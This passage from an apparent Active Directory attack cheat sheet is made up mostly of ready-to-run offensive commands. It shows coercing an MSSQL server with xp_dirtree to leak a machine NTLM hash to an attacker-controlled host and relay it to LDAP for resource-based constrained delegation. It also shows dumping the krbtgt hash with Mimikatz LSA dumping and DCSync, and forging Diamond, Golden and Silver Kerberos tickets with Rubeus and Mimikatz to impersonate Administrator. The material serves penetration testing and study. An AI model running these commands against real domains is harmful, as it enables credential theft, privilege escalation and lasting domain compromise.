CodeMirror-gutter-elt" style="left: 0px; width: 21px;">6</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-punctuation">.\</span><span class="cm-identifier">Rubeus</span><span class="cm-punctuation">.</span><span class="cm-identifier">exe</span> <span class="cm-identifier">s4u</span> <span class="cm-operator">/</span><span class="cm-identifier">user</span><span class="cm-operator">:</span><span class="cm-identifier">ServiceB</span><span class="cm-error">$</span> <span class="cm-operator">/</span><span class="cm-identifier">aes256</span><span class="cm-operator">:&lt;</span><span class="cm-identifier">serviceB_key</span><span class="cm-operator">&gt;</span> <span class="cm-operator">/</span><span class="cm-identifier">tgs</span><span class="cm-operator">:&lt;</span><span class="cm-identifier">obtained_TGS</span><span class="cm-operator">&gt;</span> <span class="cm-operator">/</span><span class="cm-identifier">msdsspn</span><span class="cm-operator">:</span><span class="cm-identifier">time</span><span class="cm-operator">/</span><span class="cm-identifier">serviceC</span><span class="cm-punctuation">.</span><span class="cm-identifier">contoso</span><span class="cm-punctuation">.</span><span class="cm-identifier">local</span> <span class="cm-operator">/</span><span class="cm-identifier">altservice</span><span class="cm-operator">:</span><span class="cm-identifier">cifs</span> <span class="cm-operator">/</span><span class="cm-identifier">domain</span><span class="cm-operator">:</span><span class="cm-identifier">domain</span><span class="cm-punctuation">.</span><span class="cm-identifier">local</span> <span class="cm-operator">/</span><span class="cm-identifier">dc</span><span class="cm-operator">:</span><span class="cm-identifier">DC</span><span class="cm-punctuation">.</span><span class="cm-identifier">domain</span><span class="cm-punctuation">.</span><span class="cm-identifier">local</span> <span class="cm-operator">/</span><span class="cm-identifier">ptt</span></span></pre></div></div></div></div></div></div><div style="position: absolute; height: 40px; width: 1px; border-bottom: 10px solid transparent; top: 142px;"></div><div class="CodeMirror-gutters" style="height: 192px;"><div class="CodeMirror-gutter CodeMirror-linenumbers" style="width: 29px;"></div></div></div><div class="CodeMirror-copy"><svg viewBox="0 0 24 24" width="16" height="16" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></div></div>
<h4 id="bkmrk-rbcd-from-mssql-serv">RBCD from MSSQL server</h4>
<p id="bkmrk-if-we-have-sufficien">If we have sufficient access to a MSSQL server we can use the <code>xp_dirtree</code> in order to leak the Net-NTLM hash of the machine account. Additionally, the <strong>Web Service</strong> client must be running on the machine in order to trick the authentication from SMB to HTTP and avoid the NTLM signature (authentication must be sent to <code>@80</code>):</p>
<ul id="bkmrk-create-a-dns-record-"><li>Create a DNS record in order to be able to leak the NTLM hash externally</li>
<li>Use the <code>xp_dirtree</code> (or <code>xp_fileexist</code>) function to the created DNS record on <code>@80</code>. This will force the authentication and leak the hash</li>
<li>Relay the machine hash to the LDAP server to add a controlled account (<strong>with a SPN</strong> for the further S4USelf request) to the <code>msDS-AllowedToActOnBehalfOfOtherIdentity</code> of the target machine</li>
<li>Now we can ask a TGS for a user we want to impersonate for a service on the machine</li>
</ul><div class="CodeMirror cm-s-moxer" translate="no"><div class="CodeMirror-vscrollbar" tabindex="-1" cm-not-content="true"><div style="min-width: 1px; height: 0px;"></div></div><div class="CodeMirror-hscrollbar" tabindex="-1" cm-not-content="true" style="display: block; right: 0px; left: 29px;"><div style="height: 100%; min-height: 1px; width: 1129px;"></div></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 29px; margin-bottom: -10px; border-right-width: 40px; min-height: 271px; min-width: 1128.9px; padding-right: 0px; padding-bottom: 10px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre class="CodeMirror-line-like"><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-cursors"></div><div class="CodeMirror-code" role="presentation" contenteditable="true" autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style=""><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">1</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-comment">#Add the DNS</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">2</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-identifier">Invoke-DNSUpdate</span> <span class="cm-operator">-</span><span class="cm-identifier">DNSType</span> <span class="cm-identifier">A</span> <span class="cm-operator">-</span><span class="cm-identifier">DNSName</span> <span class="cm-identifier">attacker</span><span class="cm-punctuation">.</span><span class="cm-identifier">domain</span><span class="cm-punctuation">.</span><span class="cm-identifier">local</span> <span class="cm-operator">-</span><span class="cm-identifier">DNSData</span> <span class="cm-operator">&lt;</span><span class="cm-identifier">attacker_IP</span><span class="cm-operator">&gt;</span> <span class="cm-operator">-</span><span class="cm-identifier">Realm</span> <span class="cm-identifier">domain</span><span class="cm-punctuation">.</span><span class="cm-identifier">local</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">3</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text=""></span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">4</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-comment">#On our machine, waiting for the leak</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">5</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-comment">#https://gist.github.com/3xocyte/4ea8e15332e5008581febdb502d0139c</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">6</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-identifier">python</span> <span class="cm-identifier">rbcd_relay</span><span class="cm-punctuation">.</span><span class="cm-identifier">py</span> <span class="cm-number">192.168.24.10</span> <span class="cm-identifier">domain</span><span class="cm-punctuation">.</span><span class="cm-identifier">local</span> <span class="cm-string">'target$'</span> <span class="cm-operator">&lt;</span><span class="cm-identifier">controlledAccountWithASPN</span><span class="cm-operator">&gt;</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">7</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text=""></span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">8</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-comment">#ON the MSSQL server</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">9</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-identifier">SQLCMD</span> <span class="cm-operator">-</span><span class="cm-identifier">S</span> <span class="cm-operator">&lt;</span><span class="cm-identifier">MSSQL_instance</span><span class="cm-operator">&gt;</span> <span class="cm-operator">-</span><span class="cm-identifier">Q</span> <span class="cm-string">"exec master.dbo.xp_dirtree '\\attacker@80\a'"</span> <span class="cm-operator">-</span><span class="cm-identifier">U</span> <span class="cm-identifier">Admin</span> <span class="cm-operator">-</span><span class="cm-identifier">P</span> <span class="cm-identifier">Admin</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">10</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text=""></span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">11</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-comment">#After the attack, ask for a TGS with full S4U</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">12</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-punctuation">.\</span><span class="cm-identifier">Rubeus</span><span class="cm-punctuation">.</span><span class="cm-identifier">exe</span> <span class="cm-identifier">s4u</span> <span class="cm-operator">/</span><span class="cm-identifier">user</span><span class="cm-operator">:&lt;</span><span class="cm-identifier">controlled_account</span><span class="cm-operator">&gt;</span> <span class="cm-operator">/</span><span class="cm-identifier">rc4</span><span class="cm-operator">:&lt;</span><span class="cm-identifier">hash</span><span class="cm-operator">&gt;</span> <span class="cm-operator">/</span><span class="cm-identifier">impersonateuser</span><span class="cm-operator">:</span><span class="cm-identifier">Administrator</span> <span class="cm-operator">/</span><span class="cm-identifier">msdsspn</span><span class="cm-operator">:</span><span class="cm-identifier">cifs</span><span class="cm-operator">/&lt;</span><span class="cm-identifier">target</span><span class="cm-operator">&gt;</span> <span class="cm-operator">/</span><span class="cm-identifier">domain</span><span class="cm-operator">:</span><span class="cm-identifier">domain</span><span class="cm-punctuation">.</span><span class="cm-identifier">local</span> <span class="cm-operator">/</span><span class="cm-identifier">dc</span><span class="cm-operator">:</span><span class="cm-identifier">DC</span><span class="cm-punctuation">.</span><span class="cm-identifier">domain</span><span class="cm-punctuation">.</span><span class="cm-identifier">local</span> <span class="cm-operator">/</span><span class="cm-identifier">ptt</span></span></pre></div></div></div></div></div></div><div style="position: absolute; height: 40px; width: 1px; border-bottom: 10px solid transparent; top: 271px;"></div><div class="CodeMirror-gutters" style="height: 321px;"><div class="CodeMirror-gutter CodeMirror-linenumbers" style="width: 29px;"></div></div></div><div class="CodeMirror-copy"><svg viewBox="0 0 24 24" width="16" height="16" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></div></div>
<h2 id="bkmrk-domain-persistence">Domain Persistence</h2>
<h3 id="bkmrk-diamond-ticket">Diamond Ticket</h3>
<p id="bkmrk-blog-here"><a href="https://www.semperis.com/blog/a-diamond-ticket-in-the-ruff/">Blog here</a></p>
<div class="CodeMirror cm-s-moxer" translate="no"><div class="CodeMirror-vscrollbar" tabindex="-1" cm-not-content="true"><div style="min-width: 1px; height: 0px;"></div></div><div class="CodeMirror-hscrollbar" tabindex="-1" cm-not-content="true" style="display: block; right: 0px; left: 29px;"><div style="height: 100%; min-height: 1px; width: 1476px;"></div></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 29px; margin-bottom: -10px; border-right-width: 40px; min-height: 34px; min-width: 1476.33px; padding-right: 0px; padding-bottom: 10px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre class="CodeMirror-line-like"><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-cursors"></div><div class="CodeMirror-code" role="presentation" contenteditable="true" autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0"><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">1</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-punctuation">.\</span><span class="cm-identifier">Rubeus</span><span class="cm-punctuation">.</span><span class="cm-identifier">exe</span> <span class="cm-identifier">diamond</span> <span class="cm-operator">/</span><span class="cm-identifier">krbkey</span><span class="cm-operator">:&lt;</span><span class="cm-identifier">aes_krbtgt_key</span><span class="cm-operator">&gt;</span> <span class="cm-operator">/</span><span class="cm-identifier">user</span><span class="cm-operator">:</span><span class="cm-identifier">user1</span> <span class="cm-operator">/</span><span class="cm-identifier">password</span><span class="cm-operator">:</span><span class="cm-identifier">password</span> <span class="cm-operator">/</span><span class="cm-identifier">enctype</span><span class="cm-operator">:</span><span class="cm-identifier">aes</span> <span class="cm-operator">/</span><span class="cm-identifier">domain</span><span class="cm-operator">:</span><span class="cm-identifier">domain</span><span class="cm-punctuation">.</span><span class="cm-identifier">local</span> <span class="cm-operator">/</span><span class="cm-identifier">dc</span><span class="cm-operator">:</span><span class="cm-identifier">dc</span><span class="cm-punctuation">.</span><span class="cm-identifier">domain</span><span class="cm-punctuation">.</span><span class="cm-identifier">local</span> <span class="cm-operator">/</span><span class="cm-identifier">ticketuser</span><span class="cm-operator">:</span><span class="cm-identifier">Administrator</span> <span class="cm-operator">/</span><span class="cm-identifier">ticketuserid</span><span class="cm-operator">:&lt;</span><span class="cm-identifier">target_RID</span><span class="cm-operator">&gt;</span> <span class="cm-operator">/</span><span class="cm-identifier">groups</span><span class="cm-operator">:</span><span class="cm-number">512</span> <span class="cm-operator">/</span><span class="cm-identifier">nowrap</span></span></pre></div></div></div></div></div></div><div style="position: absolute; height: 40px; width: 1px; border-bottom: 10px solid transparent; top: 34px;"></div><div class="CodeMirror-gutters" style="height: 84px;"><div class="CodeMirror-gutter CodeMirror-linenumbers" style="width: 29px;"></div></div></div><div class="CodeMirror-copy"><svg viewBox="0 0 24 24" width="16" height="16" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></div></div>
<h3 id="bkmrk-golden-ticket">Golden Ticket</h3>
<h4 id="bkmrk-retrieve-the-krbtgt-">Retrieve the krbtgt hash</h4>
<ul id="bkmrk-from-the-dc-by-dumpi"><li>From the DC by dumping LSA</li>
</ul><div class="CodeMirror cm-s-moxer" translate="no"><div class="CodeMirror-vscrollbar" tabindex="-1" cm-not-content="true"><div style="min-width: 1px; height: 0px;"></div></div><div class="CodeMirror-hscrollbar" tabindex="-1" cm-not-content="true" style="display: block; right: 0px; left: 29px;"><div style="height: 100%; min-height: 1px; width: 477px;"></div></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 29px; margin-bottom: -10px; border-right-width: 40px; min-height: 34px; min-width: 477.476px; padding-right: 0px; padding-bottom: 10px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre class="CodeMirror-line-like"><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-cursors"></div><div class="CodeMirror-code" role="presentation" contenteditable="true" autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0"><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">1</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-identifier">Invoke-Mimikatz</span> <span class="cm-operator">-</span><span class="cm-identifier">Command</span> <span class="cm-string">'"lsadump::lsa /patch"'</span> <span class="cm-operator">-</span><span class="cm-identifier">Computername</span> <span class="cm-identifier">dc</span></span></pre></div></div></div></div></div></div><div style="position: absolute; height: 40px; width: 1px; border-bottom: 10px solid transparent; top: 34px;"></div><div class="CodeMirror-gutters" style="height: 84px;"><div class="CodeMirror-gutter CodeMirror-linenumbers" style="width: 29px;"></div></div></div><div class="CodeMirror-copy"><svg viewBox="0 0 24 24" width="16" height="16" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></div></div>
<ul id="bkmrk-with-a-dcsync"><li>With a DCSync</li>
</ul><div class="CodeMirror cm-s-moxer" translate="no"><div class="CodeMirror-vscrollbar" tabindex="-1" cm-not-content="true"><div style="min-width: 1px; height: 0px;"></div></div><div class="CodeMirror-hscrollbar" tabindex="-1" cm-not-content="true" style="display: block; right: 0px; left: 29px;"><div style="height: 100%; min-height: 1px; width: 470px;"></div></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 29px; margin-bottom: -10px; border-right-width: 40px; min-height: 34px; min-width: 470.238px; padding-right: 0px; padding-bottom: 10px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre class="CodeMirror-line-like"><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-cursors"></div><div class="CodeMirror-code" role="presentation" contenteditable="true" autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0"><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">1</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-identifier">Invoke-Mimikatz</span> <span class="cm-operator">-</span><span class="cm-identifier">Command</span> <span class="cm-string">'"lsadump::dcsync /user:domain\krbtgt"'</span></span></pre></div></div></div></div></div></div><div style="position: absolute; height: 40px; width: 1px; border-bottom: 10px solid transparent; top: 34px;"></div><div class="CodeMirror-gutters" style="height: 84px;"><div class="CodeMirror-gutter CodeMirror-linenumbers" style="width: 29px;"></div></div></div><div class="CodeMirror-copy"><svg viewBox="0 0 24 24" width="16" height="16" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></div></div>
<h4 id="bkmrk-create-tgt">Create TGT</h4>
<div class="CodeMirror cm-s-moxer" translate="no"><div class="CodeMirror-vscrollbar" tabindex="-1" cm-not-content="true"><div style="min-width: 1px; height: 0px;"></div></div><div class="CodeMirror-hscrollbar" tabindex="-1" cm-not-content="true" style="display: block; right: 0px; left: 29px;"><div style="height: 100%; min-height: 1px; width: 1404px;"></div></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 29px; margin-bottom: -10px; border-right-width: 40px; min-height: 34px; min-width: 1403.95px; padding-right: 0px; padding-bottom: 10px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre class="CodeMirror-line-like"><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-cursors"></div><div class="CodeMirror-code" role="presentation" contenteditable="true" autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0"><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">1</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-identifier">Invoke-Mimikatz</span> <span class="cm-operator">-</span><span class="cm-identifier">Command</span> <span class="cm-string">'"kerberos::golden /user:Administrator /domain:domain.local /sid:&lt;domain_SID&gt; /krbtgt:&lt;krbtgt_hash&gt; /id:500 /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ptt"'</span></span></pre></div></div></div></div></div></div><div style="position: absolute; height: 40px; width: 1px; border-bottom: 10px solid transparent; top: 34px;"></div><div class="CodeMirror-gutters" style="height: 84px;"><div class="CodeMirror-gutter CodeMirror-linenumbers" style="width: 29px;"></div></div></div><div class="CodeMirror-copy"><svg viewBox="0 0 24 24" width="16" height="16" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></div></div>
<h3 id="bkmrk-silver-ticket">Silver Ticket</h3>
<h4 id="bkmrk-create-tgs">Create TGS</h4>
<p id="bkmrk-%2Frc4-take-the-servic"><code>/rc4</code> take the service account (generally the machine account) hash</p>
<div class="CodeMirror cm-s-moxer" translate="no"><div class="CodeMirror-vscrollbar" tabindex="-1" cm-not-content="true"><div style="min-width: 1px; height: 0px;"></div></div><div class="CodeMirror-hscrollbar" tabindex="-1" cm-not-content="true" style="display: block; right: 0px; left: 29px;"><div style="height: 100%; min-height: 1px; width: 1259px;"></div></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 29px; margin-bottom: -10px; border-right-width: 40px; min-height: 34px; min-width: 1259.19px; padding-right: 0px; padding-bottom: 10px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre class="CodeMirror-line-like"><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-cursors"></div><div class="CodeMirror-code" role="presentation" contenteditable="true" autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0"><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">1</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-identifier">Invoke-Mimikatz</span> <span class="cm-operator">-</span><span class="cm-identifier">Command</span> <span class="cm-string">'"kerberos::golden /user:Administrator /domain:domain.local /sid:&lt;domain_SID&gt; /target:&lt;target&gt;.domain.local /service:CIFS /rc4:&lt;account_hash&gt; /ptt"'</span></span></pre></div></div></div></div></div></div><div style="position: absolute; height: 40px; width: 1px; border-bottom: 10px solid transparent; top: 34px;"></div><div class="CodeMirror-gutters" style="height: 84px;"><div class="CodeMirror-gutter CodeMirror-linenumbers" style="width: 29px;"></div></div></div><div class="CodeMirror-copy"><svg viewBox="0 0 24 24" width="16" height="16" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></div></div>
<p id="bkmrk-requesting-a-tgs-wit">Requesting a TGS with a valid TGT can be performed with <strong>Rubeus</strong> like this :</p>
<div class="CodeMirror cm-s-moxer" translate="no"><div class="CodeMirror-vscrollbar" tabindex="-1" cm-not-content="true"><div style="min-width: 1px; height: 0px;"></div></div><div class="CodeMirror-hscrollbar" tabindex="-1" cm-not-content="true" style="display: block; right: 0px; left: 29px;"><div style="height: 100%; min-height: 1px; width: 680px;"></div></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 29px; margin-bottom: -10px; border-right-width: 40px; min-height: 34px; min-width: 680.143px; padding-right: 0px; padding-bottom: 10px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre class="CodeMirror-line-like"><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-cursors"></div><div class="CodeMirror-code" role="presentation" contenteditable="true" autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0"><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">1</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-punctuation">.\</span><span class="cm-identifier">Rubeus</span><span class="cm-punctuation">.</span><span class="cm-identifier">exe</span> <span class="cm-identifier">asktgs</span> <span class="cm-operator">/</span><span class="cm-identifier">ticket</span><span class="cm-operator">:</span><span class="cm-identifier">tgt</span><span class="cm-punctuation">.</span><span class="cm-identifier">kirbi</span> <span class="cm-operator">/</span><span class="cm-identifier">service</span><span class="cm-operator">:</span><span class="cm-identifier">LDAP</span><span class="cm-operator">/</span><span class="cm-identifier">dc</span><span class="cm-punctuation">.</span><span class="cm-identifier">domain</span><span class="cm-punctuation">.</span><span class="cm-identifier">local</span><span class="cm-punctuation">,</span><span class="cm-identifier">cifs</span><span class="cm-operator">/</span><span class="cm-identifier">dc</span><span class="cm-punctuation">.</span><span class="cm-identifier">domain</span><span class="cm-punctuation">.</span><span class="cm-identifier">local</span> <span class="cm-operator">/</span><span class="cm-identifier">ptt</span></span></pre></div></div></div></div></div></div><div style="position: absolute; height: 40px; width: 1px; border-bottom: 10px solid transparent; top: 34px;"></div><div class="CodeMirror-gutters" style="height: 84px;"><div class="CodeMirror-gutter CodeMirror-linenumbers" style="width: 29px;"></div></div></div><div class="CodeMirror-copy"><svg viewBox="0 0 24 24" width="16" height="16" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></div></div>
<h3 id="bkmrk-skeleton-key">Skeleton Key</h3>
